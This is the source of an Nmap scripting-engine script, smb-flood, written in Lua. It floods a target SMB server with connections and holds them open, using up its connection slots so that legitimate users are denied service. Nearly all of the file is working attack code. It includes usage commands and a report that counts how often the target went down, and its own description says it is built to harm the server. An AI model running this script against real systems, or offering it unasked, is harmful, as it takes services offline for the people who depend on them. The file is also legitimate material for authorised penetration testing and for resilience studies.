local smb = require "smb"
local stdnse = require "stdnse"
local string = require "string"
local nmap = require "nmap"
local coroutine = require "coroutine"
local datetime = require "datetime"

description = [[
Exhausts a remote SMB server's connection limit by by opening as many
connections as we can.  Most implementations of SMB have a hard global
limit of 11 connections for user accounts and 10 connections for
anonymous. Once that limit is reached, further connections are
denied. This script exploits that limit by taking up all the
connections and holding them.

This works better with a valid user account, because Windows reserves
one slot for valid users. So, no matter how many anonymous connections
are taking up spaces, a single valid user can still log in.

This is *not* recommended as a general purpose script, because a) it
is designed to harm the server and has no useful output, and b) it
never ends (until timeout).
]]

---
-- @usage
-- nmap --script smb-flood.nse -p445 <host>
-- sudo nmap -sU -sS --script smb-flood.nse -p U:137,T:139 <host>
--
-- @args smb-flood.timelimit The amount of time the script should run.
--                           Default: 30m
--
-- @output
-- Target down 30 times in 1m.
-- 320 connections made, 11 max concurrent connections.
-- 10 connections on average required to deny service.


author = "Ron Bowes"
copyright = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","dos"}
dependencies = {"smb-brute"}

local time_limit, arg_error = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. '.timelimit') or '30m')

hostrule = function(host)
  if not time_limit then
    stdnse.verbose("Invalid timelimit: %s", arg_error)
    return false
  end
  return smb.get_port(host) ~= nil
end

local State = {
  new = function (self, host)
    local now = nmap.clock()
    local o = {
      host = host,
      start_time = now,
      end_time = time_limit + now,
      threads = {},
      count = 0, -- current number of connections
      num_dead = 0, -- number of times connect failed
      max = 0, -- highest number of connections sustained
      total = 0, -- total number of connections established
      avg = 0, -- average number of connections required to DoS
      terminate = false,
    }
    o.condvar = nmap.condvar(o)
    setmetatable(o, self)
    self.__index = self
    return o
  end,

  timedout = function (self)
    return nmap.clock() >= self.end_time
  end,

  go = function(self)
    while not self.timedout() do
      local status, smbstate = smb.start_ex(self.host, true, true)
      if status then -- Success, spawn a thread to watch this one.
        self.count = self.count + 1
        self.total = self.total + 1
        local co = stdnse.new_thread(self.smb_monitor, self, smbstate)
        self.threads[co] = true
      else -- Failed to connect; target dead? sleep.
        self.num_dead = self.num_dead + 1
        if self.count > self.max then
          self.max = self.count
        end
        self.avg = self.avg + (self.count - self.avg) / self.num_dead
        stdnse.debug1("SMB connect failed: %s", smbstate)
        stdnse.sleep(1)
      end

      self.reap_threads()
    end

    -- Timed out. Wait for the threads to finish.
    self.terminate = true
    while next(self.threads) do
      self.condvar("wait")
      self.reap_threads()
    end
  end,

  reap_threads = function(self)
    for t in pairs(self.threads) do
      if coroutine.status(t) == "dead" then
        self.count = self.count - 1
        self.threads[t] = nil
      end
    end
  end,

  smb_monitor = function(self, smbstate)
    while not self.terminate do
      -- Try to read from the connection so that we get notified if it is closed by the server.
      local status, result = smb.smb_read(smbstate, false)
      if not status and not string.match(result, "TIMEOUT") then
        break
      end
    end
    smb.stop(smbstate)
    self.condvar("signal")
  end,

  report = function(self)
    return ("Target down %d times in %s.\n"
      .. "%d connections made, %d max concurrent connections.\n"
      .. "%d connections on average required to deny service."):format(
      self.num_dead, datetime.format_time(self.end_time - self.start_time),
      self.total, self.max, self.avg)
  end
}

action = function(host)
  local state = State:new(host)

  state.go()

  return state.report()
end

